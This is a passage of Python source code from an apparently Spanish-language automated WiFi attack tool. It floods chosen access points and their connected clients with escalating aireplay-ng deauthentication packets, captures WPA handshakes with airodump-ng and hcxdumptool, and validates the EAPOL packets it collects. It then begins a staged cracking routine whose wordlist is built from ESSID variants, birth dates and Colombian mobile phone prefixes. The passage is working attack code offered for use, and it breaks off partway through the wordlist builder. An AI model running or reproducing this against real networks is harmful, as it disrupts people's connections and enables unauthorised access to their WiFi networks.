                        self.log(f"Handshake válido con EAPOL detectado en intento {attempt + 1}", "SUCCESS")
                        break
                    else:
                        self.log(f"Handshake detectado pero SIN paquetes EAPOL útiles (intento {attempt + 1})", "WARNING")
                elif "WPA (0 handshake)" in output:
                    self.log(f"Aún no hay handshake válido (intento {attempt + 1})", "WARNING")
            
            if not handshake_captured:
                self.log(f"Aún sin handshake, continuando ataques...", "INFO")
        
        if not handshake_captured:
            self.log("Esperando tiempo adicional para captura completa...", "INFO")
            time.sleep(30)
        
        # Detener captura
        dump_process.terminate()
        time.sleep(2)
        
        # Verificar si se capturó handshake con múltiples verificaciones
        cap_file = f"{capture_file}-01.cap"
        if os.path.exists(cap_file):
            file_size = os.path.getsize(cap_file)
            self.log(f"Archivo de captura: {file_size} bytes", "INFO")
            
            # Verificar con aircrack-ng
            success, output, _ = self.run_command(f"aircrack-ng {cap_file}")
            
            # Si aircrack-ng no puede procesar por falta de EAPOL, intentar con tshark
            if "no EAPOL data" in output or "unable to process" in output:
                self.log("Aircrack-ng no puede procesar - verificando EAPOL con tshark...", "INFO")
                
                # Verificar paquetes EAPOL con tshark
                tshark_success, tshark_output, _ = self.run_command(
                    f'tshark -r {cap_file} -Y "eapol" -T fields -e frame.number | wc -l'
                )
                
                if tshark_success:
                    eapol_count = int(tshark_output.strip()) if tshark_output.strip().isdigit() else 0
                    self.log(f"Paquetes EAPOL encontrados: {eapol_count}", "INFO")
                    
                    if eapol_count >= 4:  # Necesitamos al menos 4 paquetes EAPOL para un handshake
                        self.log(f"Suficientes paquetes EAPOL detectados", "SUCCESS")
                        return cap_file
                    else:
                        self.log(f"Insuficientes paquetes EAPOL ({eapol_count}/4 mínimos)", "WARNING")
                        return None
            
            # Verificar que realmente hay handshake válido - no solo paquetes WPA
            has_handshake = ("WPA (1 handshake)" in output or 
                           "WPA (2 handshake)" in output or 
                           "WPA (3 handshake)" in output or 
                           "WPA (4 handshake)" in output or
                           "handshakes" in output.lower())
            
            if has_handshake and "no EAPOL data" not in output:
                self.log(f"Handshake válido capturado para {target['essid']}", "SUCCESS")
                return cap_file
            else:
                self.log(f"Archivo de captura existe pero NO contiene handshake útil", "WARNING")
                if "WPA (0 handshake)" in output:
                    self.log(f"El archivo tiene paquetes WPA pero ningún handshake completo", "ERROR")
                elif "no EAPOL data" in output:
                    self.log(f"El archivo no contiene paquetes EAPOL necesarios", "ERROR")
                self.log(f"Es necesario forzar más reconexiones de clientes", "INFO")
                self.log(f"Salida de aircrack-ng: {output[:200]}...", "INFO")
        
        self.log(f"Método tradicional falló - probando captura alternativa con hcxdumptool...", "WARNING")
        
        # Método alternativo con hcxdumptool (más moderno)
        return self.alternative_handshake_capture(target)

    def alternative_handshake_capture(self, target):
        """Método alternativo de captura usando hcxdumptool y técnicas avanzadas"""
        self.log(f"Iniciando captura alternativa para {target['essid']}", "INFO")
        
        # Archivo de captura alternativo
        alt_capture_file = self.handshake_dir / f"{target['essid']}_alt_{target['bssid'].replace(':', '')}.pcapng"
        
        # Verificar si hcxdumptool está disponible
        hcx_available, _, _ = self.run_command("which hcxdumptool")
        
        if hcx_available:
            self.log("Usando hcxdumptool para captura avanzada...", "INFO")
            
            # Comando hcxdumptool con filtro para el target específico
            hcx_command = f"timeout 60 hcxdumptool -i {self.monitor_interface} -o {alt_capture_file} --enable_status=1 --filterlist_ap={target['bssid']} --filtermode=2"
            
            hcx_process = subprocess.Popen(hcx_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Esperar un poco y luego hacer deauth
            time.sleep(5)
            
            # Deauth continuo durante la captura
            for _ in range(10):
                deauth_cmd = f"aireplay-ng -0 3 -a {target['bssid']} {self.monitor_interface}"
                subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(3)
            
            # Esperar que termine
            hcx_process.wait()
            
            if alt_capture_file.exists() and alt_capture_file.stat().st_size > 1000:
                self.log(f"Captura alternativa completada: {alt_capture_file.stat().st_size} bytes", "SUCCESS")
                
                # Convertir a formato cap si es necesario
                cap_output = str(alt_capture_file).replace('.pcapng', '.cap')
                convert_success, _, _ = self.run_command(f"tshark -r {alt_capture_file} -w {cap_output}")
                
                if convert_success and os.path.exists(cap_output):
                    return cap_output
                else:
                    return str(alt_capture_file)
        
        self.log(f"No se pudo capturar handshake con métodos alternativos", "ERROR")
        return None

    def count_eapol_packets(self, file_path):
        """Contar paquetes EAPOL en archivo de captura"""
        try:
            # Método 1: Usar tshark si está disponible
            success, output, _ = self.run_command(
                f'tshark -r "{file_path}" -Y "eapol" -T fields -e frame.number 2>/dev/null | wc -l'
            )
            if success and output.strip().isdigit():
                return int(output.strip())
            
            # Método 2: Usar tcpdump como alternativa
            success, output, _ = self.run_command(
                f'tcpdump -r "{file_path}" -c 1000 2>/dev/null | grep -c "EAPOL"'
            )
            if success and output.strip().isdigit():
                return int(output.strip())
            
            # Método 3: Verificar con aircrack-ng
            success, output, _ = self.run_command(f'aircrack-ng "{file_path}" 2>/dev/null')
            if success and "handshake" in output.lower():
                # Intentar extraer número de handshakes
                import re
                handshake_matches = re.findall(r'WPA \((\d+) handshake', output)
                if handshake_matches:
                    return int(handshake_matches[0]) * 4  # Cada handshake tiene ~4 paquetes EAPOL
            
            return 0
        except Exception as e:
            self.log(f"Error contando paquetes EAPOL: {e}", "ERROR")
            return 0

    def _enable_monitor_alternative(self):
        """Método alternativo para habilitar modo monitor usando iw"""
        self.log("Intentando método alternativo con iw...", "INFO")
        
        try:
            # Método 1: Usar iw directamente
            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
            iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
            
            # Primero bajar la interfaz
            self.run_command(f"ip link set {self.interface} down")
            time.sleep(1)
            
            # Cambiar a modo monitor
            success, output, error = self.run_command(f"{iw_path} dev {self.interface} set type monitor")
            if not success:
                self.log(f"Error cambiando a modo monitor: {error}", "WARNING")
                
                # Método 2: Crear nueva interfaz en modo monitor
                self.log("Intentando crear nueva interfaz en modo monitor...", "INFO")
                monitor_name = f"{self.interface}mon"
                
                # Crear nueva interfaz
                success, _, _ = self.run_command(f"iw phy phy0 interface add {monitor_name} type monitor")
                if success:
                    self.monitor_interface = monitor_name
                    self.run_command(f"ip link set {monitor_name} up")
                    
                # Verificar que funciona
                success, output, _ = self.run_command(f"{iwconfig_path} {monitor_name} 2>/dev/null")
                if success and "Mode:Monitor" in output:
                    self.log(f"Modo monitor alternativo exitoso: {monitor_name}", "SUCCESS")
                    return True
            else:
                # Subir la interfaz
                self.run_command(f"ip link set {self.interface} up")
                time.sleep(1)
                
                # Verificar modo monitor
                success, output, _ = self.run_command(f"{iwconfig_path} {self.interface} 2>/dev/null")
                if success and "Mode:Monitor" in output:
                    self.monitor_interface = self.interface
                    self.log(f"Modo monitor alternativo exitoso: {self.interface}", "SUCCESS")
                    return True
            
            # Método 3: Usar iwconfig como último recurso
            self.log("Intentando con iwconfig como último recurso...", "INFO")
            success, _, _ = self.run_command(f"{iwconfig_path} {self.interface} mode monitor 2>/dev/null")
            if success:
                self.run_command(f"ip link set {self.interface} up")
                time.sleep(1)
                
                success, output, _ = self.run_command(f"{iwconfig_path} {self.interface} 2>/dev/null")
                if success and "Mode:Monitor" in output:
                    self.monitor_interface = self.interface
                    self.log(f"Modo monitor con iwconfig exitoso: {self.interface}", "SUCCESS")
                    return True
            
            self.log("Todos los métodos alternativos fallaron", "ERROR")
            return False
            
        except Exception as e:
            self.log(f"Error en método alternativo: {e}", "ERROR")
            return False

    def aggressive_handshake_capture(self, target):
        """Captura de handshake mejorada con detección de clientes y múltiples estrategias"""
        self.log(f"Iniciando captura mejorada: {target['essid']} (Canal {target['channel']})", "INFO")
        
        # PASO 1: Escanear clientes conectados primero (con timeout)
        clients = []
        try:
            clients = self.scan_connected_clients(target)
        except Exception as e:
            self.log(f"Error en escaneo de clientes: {e} - continuando sin detección", "WARNING")
        
        if not clients:
            self.log(f"ATENCION: No se detectan clientes conectados a {target['essid']}", "WARNING")
            self.log("   Procediendo directamente con ataques broadcast optimizados...", "INFO")
            # Usar información del target original si tenía clientes
            if target.get('clients', 0) > 0:
                self.log(f"   NOTA: Escaneo inicial mostró {target['clients']} clientes - probablemente estén activos", "INFO")
                clients = ['INFERRED_FROM_SCAN']  # Marcador para usar estrategias de clientes
        else:
            self.log(f"Detectados {len(clients)} clientes conectados - excelente!", "SUCCESS")
            for i, client in enumerate(clients[:3], 1):
                self.log(f"   Cliente {i}: {client}", "INFO")
        
        # Archivo de captura
        capture_filename = f"{target['essid']}_{target['bssid'].replace(':', '')}"
        capture_file = self.handshake_dir / capture_filename
        cap_file = f"{capture_file}-01.cap"
        
        # PASO 2: Configurar captura optimizada
        self.run_command(f"iwconfig {self.monitor_interface} channel {target['channel']}")
        time.sleep(1)  # Asegurar cambio de canal
        
        # Comando de captura con mejor buffer
        dump_cmd = f"airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {capture_file} --write-interval 1"
        dump_process = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        self.log("Captura iniciada, monitoreando trafico...", "INFO")
        time.sleep(8)  # Tiempo mayor para capturar tráfico inicial
        
        # PASO 3: Estrategias de deauth mejoradas
        handshake_found = False
        
        # Estrategia 1: Ataques dirigidos a clientes específicos
        if clients:
            self.log("ESTRATEGIA 1: Ataques dirigidos a clientes especificos", "INFO")
            for client in clients[:3]:  # Máximo 3 clientes
                if not self.running:
                    break
                
                self.log(f"   Atacando cliente especifico: {client}", "INFO")
                
                # Deauth dirigido al cliente específico
                deauth_client_cmd = f"aireplay-ng -0 15 -a {target['bssid']} -c {client} {self.monitor_interface}"
                subprocess.run(deauth_client_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Esperar reconexión
                time.sleep(8)
                
                # Verificar handshake temprano
                if self.check_handshake_quick(cap_file):
                    handshake_found = True
                    break
        
        # Estrategia 2: Ataques broadcast progresivos si no hay handshake aun
        if not handshake_found:
            self.log("ESTRATEGIA 2: Ataques broadcast progresivos", "INFO")
            
            deauth_rounds = [
                (8, 5, "suave"),     # 8 paquetes, esperar 5s
                (15, 8, "moderado"), # 15 paquetes, esperar 8s  
                (25, 12, "agresivo"),# 25 paquetes, esperar 12s
                (40, 15, "intenso"), # 40 paquetes, esperar 15s
            ]
            
            # Inicializar barra de progreso para deauth
            deauth_progress = ProgressBar(
                total=len(deauth_rounds),
                prefix="CAPTURA Handshake",
                suffix="Aplicando ataques deauth...",
                length=40
            )
            
            for round_num, (packets, wait_time, intensity) in enumerate(deauth_rounds, 1):
                if not self.running or handshake_found:
                    deauth_progress.finish("Interrumpido" if not self.running else "Handshake encontrado")
                    break
                
                # Actualizar progreso
                deauth_progress.update(
                    round_num,
                    f"Ronda {round_num}/{len(deauth_rounds)}: {packets} paquetes ({intensity})"
                )
                
                # Combinar ataques broadcast y dirigidos
                # Ataque broadcast
                deauth_broadcast = f"aireplay-ng -0 {packets} -a {target['bssid']} {self.monitor_interface}"
                subprocess.run(deauth_broadcast, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Si hay clientes, también atacarlos directamente
                if clients and round_num >= 2:
                    time.sleep(2)
                    for client in clients[:2]:
                        deauth_targeted = f"aireplay-ng -0 5 -a {target['bssid']} -c {client} {self.monitor_interface}"
                        subprocess.run(deauth_targeted, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(1)
                
                # Espera con progreso visual
                wait_progress = ProgressBar(
                    total=wait_time,
                    prefix=f"    Esperando reconexiones",
                    suffix="segundos",
                    length=25
                )
                
                for second in range(wait_time + 1):
                    if not self.running:
                        wait_progress.finish("Interrumpido")
                        break
                    wait_progress.update(second, f"Tiempo restante: {wait_time - second}s")
                    time.sleep(1)
                
                if self.running:
                    wait_progress.finish("Verificando handshake...")
                
                # Verificación de handshake más robusta
                if self.verify_handshake_comprehensive(cap_file):
                    handshake_found = True
                    deauth_progress.finish("HANDSHAKE CAPTURADO!")
                    break
                    
            if not handshake_found:
                deauth_progress.finish("Ataques deauth completados")
        
        # PASO 4: Captura extendida final si es necesario
        if not handshake_found:
            self.log("Captura extendida final de 30 segundos...", "INFO")
            
            # Un último ataque intenso
            final_deauth = f"aireplay-ng -0 50 -a {target['bssid']} {self.monitor_interface}"
            subprocess.run(final_deauth, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(30)
        
        # PASO 5: Detener captura y verificación final
        dump_process.terminate()
        time.sleep(3)
        
        return self.final_handshake_verification(cap_file, target)
    
    def fast_handshake_capture(self, target):
        """Captura rápida de handshake sin escaneo de clientes (fallback)"""
        self.log(f"Iniciando captura rápida: {target['essid']} (Canal {target['channel']})", "INFO")
        
        # Archivo de captura
        capture_filename = f"{target['essid']}_{target['bssid'].replace(':', '')}"
        capture_file = self.handshake_dir / capture_filename
        cap_file = f"{capture_file}-01.cap"
        
        # Configurar canal
        self.run_command(f"iwconfig {self.monitor_interface} channel {target['channel']}")
        time.sleep(1)
        
        # Iniciar captura
        dump_cmd = f"airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {capture_file} --write-interval 1"
        dump_process = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        self.log("Captura iniciada - aplicando deauth inmediato...", "INFO")
        time.sleep(3)
        
        # Ataques de deauth rápidos y efectivos
        deauth_rounds = [
            10,  # 10 paquetes
            20,  # 20 paquetes  
            30,  # 30 paquetes
            50,  # 50 paquetes intensos
        ]
        
        for round_num, packets in enumerate(deauth_rounds, 1):
            if not self.running:
                break
                
            self.log(f"Deauth rápido {round_num}/4: {packets} paquetes", "INFO")
            
            # Deauth broadcast
            deauth_cmd = f"aireplay-ng -0 {packets} -a {target['bssid']} {self.monitor_interface}"
            subprocess.run(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Esperar reconexiones
            wait_time = 5 + (round_num * 2)  # 5, 7, 9, 11 segundos
            self.log(f"Esperando {wait_time}s...", "INFO")
            time.sleep(wait_time)
            
            # Verificación rápida
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 3000:
                if self.check_handshake_quick(cap_file):
                    self.log("Handshake capturado con método rápido!", "SUCCESS")
                    break
        
        # Captura final
        if not self.check_handshake_quick(cap_file):
            self.log("Captura final de 15 segundos...", "INFO")
            time.sleep(15)
        
        # Detener
        dump_process.terminate()
        time.sleep(2)
        
        return self.final_handshake_verification(cap_file, target)
    
    def scan_connected_clients(self, target):
        """Escanear clientes conectados al AP objetivo"""
        self.log(f"Escaneando clientes conectados a {target['essid']}...", "INFO")
        
        clients = []
        scan_file = "/tmp/client_scan"
        
        # Timeout general para toda la función - máximo 20 segundos
        import signal
        
        def timeout_handler(signum, frame):
            raise TimeoutError("Escaneo de clientes excedió el tiempo límite")
        
        old_handler = signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(20)  # 20 segundos máximo para toda la función
        
        try:
            # Limpiar archivos previos
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                temp_file = f"{scan_file}{ext}"
                if os.path.exists(temp_file):
                    os.remove(temp_file)
            
            # Escaneo rápido de 8 segundos con timeout forzado
            self.log("Iniciando escaneo rápido de clientes (8 segundos)...", "INFO")
            scan_cmd = f"timeout 8 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {scan_file} --write-interval 1"
            
            # Ejecutar con timeout adicional por si acaso
            process = subprocess.Popen(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            try:
                # Esperar máximo 10 segundos (8 del timeout + 2 de margen)
                process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self.log("Timeout del escaneo de clientes - terminando proceso...", "WARNING")
                process.terminate()
                time.sleep(1)
                if process.poll() is None:
                    process.kill()
                    time.sleep(1)
            
            # Buscar el archivo CSV generado
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    content = f.read()
                    # Buscar la sección de clientes (después de la línea Station MAC)
                    if "Station MAC" in content:
                        lines = content.split('\n')
                        in_clients_section = False
                        
                        for line in lines:
                            if "Station MAC" in line:
                                in_clients_section = True
                                continue
                            
                            if in_clients_section and line.strip():
                                # Línea de cliente: MAC, First time seen, Last time seen, Power, packets, BSSID, Probed ESSIDs
                                parts = line.split(',')
                                if len(parts) >= 6:
                                    client_mac = parts[0].strip()
                                    associated_bssid = parts[5].strip()
                                    
                                    # Verificar que el cliente está asociado con nuestro target
                                    if client_mac and associated_bssid == target['bssid']:
                                        clients.append(client_mac)
                
                # Limpiar archivos temporales
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    temp_file = f"{scan_file}{ext}"
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
            
            # Método alternativo 1: escaneo rápido directo (solo 5 segundos)
            if not clients:
                self.log("Metodo alternativo 1: escaneo ultra rápido (5s)...", "INFO")
                try:
                    scan_cmd2 = f"timeout 5 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']}"
                    result = subprocess.run(scan_cmd2, shell=True, capture_output=True, text=True, timeout=7)
                    
                    # Buscar MACs en la salida que no sean el BSSID del AP
                    import re
                    mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
                    found_macs = re.findall(mac_pattern, result.stdout)
                    
                    for mac_parts in found_macs:
                        full_mac = ''.join(mac_parts[0] + mac_parts[1])
                        if full_mac != target['bssid'] and full_mac not in clients:
                            clients.append(full_mac)
                            
                except (subprocess.TimeoutExpired, Exception) as e:
                    self.log(f"Metodo alternativo 1 timeout/error: {e}", "WARNING")
            
            # Método alternativo 2: usar información del escaneo inicial si está disponible
            if not clients and hasattr(self, 'last_scan_data'):
                self.log("Metodo alternativo 2: usando datos del escaneo inicial...", "INFO")
                # Buscar clientes del escaneo inicial que puedan estar conectados a este AP
                for scan_target in getattr(self, 'last_scan_data', []):
                    if scan_target.get('bssid') == target['bssid'] and scan_target.get('clients', 0) > 0:
                        # Este target tenía clientes en el escaneo inicial
                        self.log(f"Scan inicial indicó {scan_target['clients']} clientes para este AP", "INFO")
                        # Generar MACs ficticios para simular presencia de clientes
                        # Esto forzará el uso de ataques dirigidos
                        clients = ['DETECTED_FROM_SCAN']  # Marcador especial
                        break
            
            return clients[:5]  # Máximo 5 clientes para evitar sobrecarga
            
        except TimeoutError:
            self.log("TIMEOUT: Escaneo de clientes excedió 20 segundos - continuando sin clientes detectados", "WARNING")
            return []
        except Exception as e:
            self.log(f"Error escaneando clientes: {e}", "ERROR")
            return []
        finally:
            # Restaurar handler de señal y cancelar alarma
            signal.alarm(0)
            signal.signal(signal.SIGALRM, old_handler)
    
    def check_handshake_quick(self, cap_file):
        """Verificación rápida de handshake"""
        if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 2000:
            return False
        
        try:
            success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=5)
            has_handshake = success and ("1 handshake" in output or "handshakes" in output.lower())
            no_eapol_errors = "no EAPOL" not in output
            return has_handshake and no_eapol_errors
        except:
            return False
    
    def verify_handshake_comprehensive(self, cap_file):
        """Verificación comprehensiva de handshake con múltiples métodos"""
        if not os.path.exists(cap_file):
            return False
        
        file_size = os.path.getsize(cap_file)
        if file_size < 1000:
            return False
        
        self.log(f"Verificando handshake: {file_size} bytes", "INFO")
        
        # Método 1: aircrack-ng
        try:
            success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=10)
            if success:
                has_handshake = ("1 handshake" in output or "2 handshake" in output or "handshakes" in output.lower())
                no_eapol_error = "no EAPOL" not in output and "unable to process" not in output
                
                if has_handshake and no_eapol_error:
                    self.log("Handshake valido confirmado con aircrack-ng", "SUCCESS")
                    return True
                elif has_handshake:
                    self.log("Handshake detectado pero con problemas EAPOL", "WARNING")
        except:
            pass
        
        # Método 2: Contar paquetes EAPOL con tshark
        try:
            eapol_cmd = f'tshark -r "{cap_file}" -Y "eapol" -T fields -e frame.number 2>/dev/null | wc -l'
            success, output, _ = self.run_command(eapol_cmd, timeout=8)
            if success and output.strip().isdigit():
                eapol_count = int(output.strip())
                self.log(f"Paquetes EAPOL detectados: {eapol_count}", "INFO")
                
                if eapol_count >= 4:
                    self.log("Suficientes paquetes EAPOL para handshake", "SUCCESS")
                    return True
                elif eapol_count >= 2:
                    self.log("Paquetes EAPOL parciales detectados", "WARNING")
        except:
            pass
        
        return False
    
    def final_handshake_verification(self, cap_file, target):
        """Verificación final comprehensiva del handshake capturado"""
        if not os.path.exists(cap_file):
            self.log("No se genero archivo de captura", "ERROR")
            return None
        
        file_size = os.path.getsize(cap_file)
        self.log(f"Archivo final: {file_size} bytes", "INFO")
        
        if file_size < 1000:
            self.log("Archivo demasiado pequeno para contener handshake", "ERROR")
            return None
        
        # Verificación con aircrack-ng
        success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=15)
        
        if success:
            self.log("Analisis de aircrack-ng:", "INFO")
            
            # Buscar indicaciones de handshake
            handshake_indicators = [
                "1 handshake", "2 handshake", "3 handshake", "4 handshake",
                "handshakes", "EAPOL"
            ]
            
            error_indicators = [
                "no EAPOL data", "unable to process", "No networks found"
            ]
            
            has_handshake = any(indicator in output.lower() for indicator in handshake_indicators)
            has_errors = any(error in output for error in error_indicators)
            
            if has_handshake and not has_errors:
                self.log(f"EXITO: Handshake valido capturado para {target['essid']}", "SUCCESS")
                self.log(f"Archivo: {cap_file}", "SUCCESS")
                return cap_file
            elif has_handshake and has_errors:
                self.log("Handshake detectado pero con problemas de formato", "WARNING")
                # Intentar reparar o convertir archivo
                return self.attempt_handshake_repair(cap_file, target)
            else:
                self.log("No se detecto handshake valido en la captura", "ERROR")
        
        # Verificacion adicional con metodos alternativos
        return self.alternative_handshake_verification(cap_file, target)
    
    def attempt_handshake_repair(self, cap_file, target):
        """Intentar reparar o convertir handshake problematico"""
        self.log("Intentando reparar handshake problematico...", "INFO")
        
        # Intentar con tshark para verificar contenido real
        try:
            eapol_check = f'tshark -r "{cap_file}" -Y "eapol" -c 10 2>/dev/null'
            success, output, _ = self.run_command(eapol_check, timeout=10)
            
            if success and output.strip():
                self.log("Encontrados paquetes EAPOL con tshark", "SUCCESS")
                return cap_file  # El archivo es utilizable
            else:
                self.log("No se encontraron paquetes EAPOL validos", "ERROR")
        except:
            pass
        
        return None
    
    def alternative_handshake_verification(self, cap_file, target):
        """Metodos alternativos para verificar handshake"""
        self.log("Verificacion alternativa del handshake...", "INFO")
        
        # Metodo 1: Analisis de tamano y contenido basico
        file_size = os.path.getsize(cap_file)
        if file_size > 5000:  # Archivos > 5KB generalmente tienen contenido util
            self.log(f"Archivo de tamano razonable ({file_size} bytes) - probablemente valido", "INFO")
            
            # Metodo 2: Verificar que no esta corrupto
            try:
                # Intentar leer con tcpdump para verificar integridad
                tcpdump_check = f'tcpdump -r "{cap_file}" -c 1 2>/dev/null'
                success, _, _ = self.run_command(tcpdump_check, timeout=5)
                
                if success:
                    self.log("Archivo integro - asumiendo handshake capturado", "INFO")
                    return cap_file
            except:
                pass
        
        self.log("No se pudo verificar handshake valido", "ERROR")
        return None

    def crack_handshake(self, target, handshake_file):
        """Sistema de cracking masivo inteligente con aprendizaje adaptativo + Cerrajero Digital"""
        self.log(f"Iniciando sistema de cracking masivo inteligente: {target['essid']}", "INFO")
        
        # Verificar archivo
        if not os.path.exists(handshake_file) or os.path.getsize(handshake_file) < 1000:
            self.log("Archivo de handshake invalido", "ERROR")
            return None
        
        # Inicializar sistema de aprendizaje
        self.crack_stats = {
            'attempted_passwords': 0,
            'failed_patterns': set(),
            'response_analysis': [],
            'time_per_attempt': [],
            'successful_prefixes': [],
            'character_frequency': {}
        }
        
        # FASE 1: Análisis rápido inicial
        self.log("FASE 1: Análisis inteligente rapido...", "INFO")
        password = self.intelligent_analysis(target)
        if password:
            return password
        
        # FASE 2: Generación masiva de contraseñas (10,000+)
        self.log("FASE 2: Generando arsenal masivo de contraseñas...", "INFO")
        password = self.massive_password_generation_attack(target, handshake_file)
        if password:
            return password
        
        # FASE 3: Ataque adaptativo con aprendizaje
        self.log("FASE 3: Ataque adaptativo con aprendizaje de patrones...", "INFO")
        password = self.adaptive_learning_attack(target, handshake_file)
        if password:
            return password
        
        # FASE 4: Análisis de respuestas de red
        self.log("FASE 4: Analisis de respuestas de red y timing attacks...", "INFO")
        password = self.network_response_analysis_attack(target, handshake_file)
        if password:
            return password
        
        # FASE 5: Fuerza bruta evolutiva
        self.log("FASE 5: Algoritmo evolutivo de contraseñas...", "INFO")
        password = self.evolutionary_password_attack(target, handshake_file)
        if password:
            return password
        
        # FASE 6: Última oportunidad - cracking paralelo masivo
        self.log("FASE 6: Cracking paralelo masivo (ultimo recurso)...", "INFO")
        password = self.parallel_massive_attack(target, handshake_file)
        if password:
            return password
            
        # FASE 7: CERRAJERO DIGITAL - Máximo uso de RAM
        self.log("FASE 7: CERRAJERO DIGITAL - Usando toda la RAM disponible...", "WARNING")
        password = self.digital_lockpicker_ram_max(target, handshake_file)
        if password:
            return password
            
        # FASE 8: CERRAJERO PROGRESIVO - Análisis posicional
        self.log("FASE 8: CERRAJERO PROGRESIVO - Ataque por posiciones como cerrajero experto...", "WARNING")
        return self.progressive_lockpicker(target, handshake_file)
    
    def massive_password_generation_attack(self, target, handshake_file):
        """Generar y probar miles de contraseñas inteligentemente"""
        essid = target['essid']
        bssid = target['bssid']
        
        self.log("Generando arsenal masivo de contraseñas...", "INFO")
        
        # Generar base de datos masiva de contraseñas
        massive_passwords = self.generate_massive_wordlist(target)
        
        self.log(f"Generadas {len(massive_passwords)} contraseñas para probar", "SUCCESS")
        
        # Dividir en lotes para procesamiento eficiente
        batch_size = 1000
        total_batches = (len(massive_passwords) + batch_size - 1) // batch_size
        
        # Inicializar barra de progreso
        progress_bar = ProgressBar(
            total=total_batches,
            prefix="FASE 2 [Arsenal Masivo]",
            suffix=f"0/{total_batches} lotes | 0/{len(massive_passwords)} contraseñas",
            length=40
        )
        
        for batch_num in range(total_batches):
            if not self.running:
                progress_bar.finish("Interrumpido por usuario")
                break
                
            start_idx = batch_num * batch_size
            end_idx = min(start_idx + batch_size, len(massive_passwords))
            batch = massive_passwords[start_idx:end_idx]
            
            # Actualizar barra de progreso
            tested_so_far = (batch_num + 1) * batch_size
            progress_bar.update(
                batch_num + 1, 
                f"{batch_num + 1}/{total_batches} lotes | {min(tested_so_far, len(massive_passwords))}/{len(massive_passwords)} contraseñas"
            )
            
            # Probar lote con análisis de respuesta
            password = self.test_password_batch_with_analysis(target, handshake_file, batch, f"lote_{batch_num + 1}")
            if password:
                progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {password}")
                return password
            
            # Actualizar estadísticas
            self.crack_stats['attempted_passwords'] += len(batch)
        
        progress_bar.finish(f"Arsenal completado - {self.crack_stats['attempted_passwords']} contraseñas probadas")
        return None
    
    def generate_massive_wordlist(self, target):
        """Generar lista masiva de contraseñas inteligentes"""
        essid = target['essid']
        bssid = target['bssid']
        passwords = set()
        
        # Limpiar ESSID para diferentes variaciones
        essid_variations = [
            essid,
            essid.lower(),
            essid.upper(), 
            essid.replace(' ', ''),
            essid.replace('-', ''),
            essid.replace('_', ''),
            ''.join(essid.split()),  # Sin espacios
        ]
        
        # Patrones numéricos extensivos
        numeric_patterns = []
        for year in range(2000, 2025):
            numeric_patterns.extend([str(year), str(year)[-2:]])
        
        for i in range(100):
            numeric_patterns.extend([f"{i:02d}", f"{i:03d}", str(i)])
        
        # Fechas de nacimiento comunes
        for year in range(1960, 2010):
            for month in range(1, 13):
                for day in [1, 15, 31] if month in [1,3,5,7,8,10,12] else ([1, 15, 30] if month != 2 else [1, 15]):
                    numeric_patterns.append(f"{day:02d}{month:02d}{year}")
                    numeric_patterns.append(f"{day:02d}{month:02d}{year % 100:02d}")
        
        # Patrones de teléfono colombianos
        phone_prefixes = ['300', '301', '302', '303', '304', '305', '310', '311', '312', '313', '314', '315', '316', '317', '318', '319', '320', '321', '322', '323', '324', '350', '351']
        for prefix in phone_prefixes:
            for i in range(1000000, 1001000):  # Solo 1000 números por prefijo
                numeric_patterns.append(f"{prefix}{str(i)[1:]}")
        
        # Combinar essid con patrones
        for essid_var in essid_variations:
            if len(essid_var) < 2:
                continue
                
            # Base + números
            for num in numeric_patterns[:5000]:  # Limitar para evitar explosión combinatoria
                combinations = [
                    essid_var + num,
                    num + essid_var,
                    essid_var + '_' + num,
                    essid_var + '-' + num,
                    essid_var.upper() + num,
                    essid_var.lower() + num.upper() if num.isalpha() else essid_var.lower() + num
                ]
                
                for combo in combinations:
                    if 8 <= len(combo) <= 63:
                        passwords.add(combo)
        
        # Patrones comunes colombianos/latinos
        common_suffixes = [
            '123', '1234', '12345', '123456', '1234567', '12345678',
            '2024', '2023', '2022', '2021', '2020',
            'casa', 'home', 'wifi', 'internet', 'familia', 'admin',
            'Colombia', 'colombia', 'Bogota', 'bogota', 'Medellin', 'medellin',
            'Cali', 'cali', 'claro', 'movistar', 'tigo', 'une', 'etb'
        ]
        
        common_prefixes = [
            'mi', 'la', 'el', 'casa', 'red', 'wifi', 'internet', 'familia'
        ]
        
        # Generar combinaciones con sufijos y prefijos
        for essid_var in essid_variations[:3]:  # Solo las 3 primeras variaciones para evitar explosión
            for suffix in common_suffixes:
